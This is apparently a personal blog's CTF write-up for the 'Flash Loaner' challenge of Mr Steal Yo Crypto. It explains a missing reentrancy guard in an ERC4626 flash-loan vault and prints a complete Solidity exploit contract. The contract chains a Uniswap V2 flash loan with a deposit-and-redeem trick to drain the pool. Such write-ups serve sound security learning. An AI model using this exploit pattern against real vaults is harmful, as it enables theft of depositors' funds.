---
title: "Mr Steal Yo Crypto — Flash Loaner"
date: 2023-07-22
draft: false
description: "CTF - 12"
tags: ["CTF"]
series: ["CTF"]
series_order: 12
topics: ["CTF"]
showAuthor: false
showAuthorsBadges : false
---

This is the #12 challenge of [Mr Steal Yo Crypto](https://mrstealyocrypto.xyz/index.html). I will try to explain how to find the vulnerability.

> A set of challenges to learn offensive security of smart contracts. Featuring interesting challenges loosely (or directly) inspired by real world exploits.
> Created by [@0xToshii](https://twitter.com/0xToshii)

I used the foundry version for this CTF: [mr-steal-yo-crypto-ctf-foundry](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement)

![Mr Steal Yo Crypto](https://cdn-images-1.medium.com/max/800/1*67w9ffBxLP4AMvoxHowZ2w.jpeg)

## Flash Loaner

No defi functionality has safeguarded crypto more from exploits than the humble flash loan.

The FlashLoaner contract accepts funds from users in order to facilitate flash loans, in which they charge a small fee. This fee is provided as yield to the depositors.

Your task is to drain 99%+ of the user funds from this contract. You start with no funds.

- [See the contracts](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement/src/flash-loaner)
- [Complete the challenge](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/12-flash-loaner.sol)

### Review of the contract

#### FlashLoaner.sol

The contract has one function related to flashloan and the rest is related to [ERC4626](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC4626.sol) and Ownable. As the name of the challenge is Flash Loaner, I decided to first check the function flash(). Most of the time, when a contract allows flashloan, there is a reentrant check in order to not use the amount inside the protocol on the protocol. However, I don’t see any check here or override on the function of ERC4626. Maybe that’s our vulnerability.

Inside flash(), the process of the flashloan is pretty simple. The contract sends you the amount requested. Then through flashCallback(), it will give the hand to your contract in order to do your things. At the end, the function checks if it gets back the amount requested and a fee.

If this is the first time you see ERC4626, I will just add some notes on this ERC. When you call deposit() or mint(), you are not updating a variable like `balance[user] = amount`. Instead, the protocol mints an `amount` of shares. In our case, if we deposit 10 USDC, we will receive 10 fUSDC. This is a proof that we send 10 USDC to this protocol. Then with your fUSDC, you can do what you want! Maybe deposit it into another protocol or send it to your friends. After that, this will be your friend who is able to withdraw 10 USDC by burning 10 fUSDC.

```solidity
// @dev Function to perform flashloan
function flash(address recipient, uint256 amount, bytes calldata data) external {
    require(totalAssets() > 0, 'zero-liquidity');
    require(amount > 0, 'invalid-amount');

    uint256 fee = amount.mulDiv(feeBasis, feeMax, Math.Rounding.Up);
    uint256 balanceBefore = totalAssets();

    IERC20(asset()).safeTransfer(recipient, amount); // optimistic transfer

    IFlashCallback(msg.sender).flashCallback(fee, data);

    uint256 balanceAfter = totalAssets();
    require((balanceBefore + fee) <= balanceAfter, 'insufficient-returned');

    uint256 paid = balanceAfter - balanceBefore; // shares remain same, total assets increase

    emit Flash(msg.sender, recipient, amount, paid);
}
```

### Exploit the vulnerability

As we saw before, we are able to request the funds of the protocol and deposit the funds inside the contract through deposit() or mint() (function of ERC4626). It means that you returned the funds and also your balance is increasing the amount that you borrow, pretty cool! But wait, how do I pay the fee? Remember that if you have no funds, you can do a flashloan through a DEX or lending market ^^:

1. Flashloan n amount of USDC on UniswapV2.
2. Borrow all the amount (z) of USDC on FlashLoaner.
3. Deposit the amount z through deposit(), we get z amount of fUSDC.
4. Send `fee` amount of USDC for paying the fee of the flashloan of Flash Loaner.
5. Withdraw all the USDC of FlashLoaner (z) by burning z fUSDC.
6. Send `n + fee` amount of USDC to the Uniswap pool.
7. Check how much you win!

Here is a quick solution:

```solidity
contract Exploit {
    FlashLoaner flashLoaner;
    Token usdc;
    IUniswapV2Pair uniPair;
    address private attacker;

    constructor(address _target, address _usdc, address _uniPair){
        flashLoaner = FlashLoaner(_target);
        usdc = Token(_usdc);
        uniPair = IUniswapV2Pair(_uniPair);
        attacker = msg.sender;
        usdc.approve(address(flashLoaner), type(uint).max);
    }

    // Will be called during flash()
    // We will deposit the amount get from flash() and pass all the check with balanceBefore and balanceAfter
    function flashCallback(uint256 fee, bytes calldata data) external {
        flashLoaner.deposit(100_000e18, address(this));
        usdc.transfer(address(flashLoaner), fee); // Send the fee for the flashloan
    }

    // We are using a flashloan from univ2 in order to pay the fee for using flash() from flashLoaner
    function uniswapV2Call(address _address, uint amount0Out, uint amount1Out, bytes memory data) external {
        console.log("balance usdc of exploit : ", usdc.balanceOf(address(this)));
        flashLoaner.flash(address(this), usdc.balanceOf(address(flashLoaner)) - 1, new bytes(0));
        console.log("balance share fusdc of exploit : ", flashLoaner.balanceOf(address(this)));
        flashLoaner.redeem(flashLoaner.balanceOf(address(this)), address(this), address(this));
        console.log("balance share fusdc of exploit : ", flashLoaner.balanceOf(address(this)));
        console.log("balance usdc of exploit : ", usdc.balanceOf(address(this)));
        console.log("amount to repay : ", (amount0Out * 103 / 100) + 1); // Yeah, the premium

 is a bit too high
        usdc.transfer(address(uniPair), (amount0Out * 103 / 100) + 1);
    }

    function pwn() external {
        uniPair.swap(10_000e18, 0, address(this), new bytes(1));
        usdc.transfer(attacker, usdc.balanceOf(address(this)));
    }
}
```

You can check my test file [here](https://github.com/gp-ngmi/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/12-flash-loaner.sol).

### Acknowledgement

Thank you [https://stermi.xyz/](https://stermi.xyz/) for inspiring me to write articles on CTF ^^.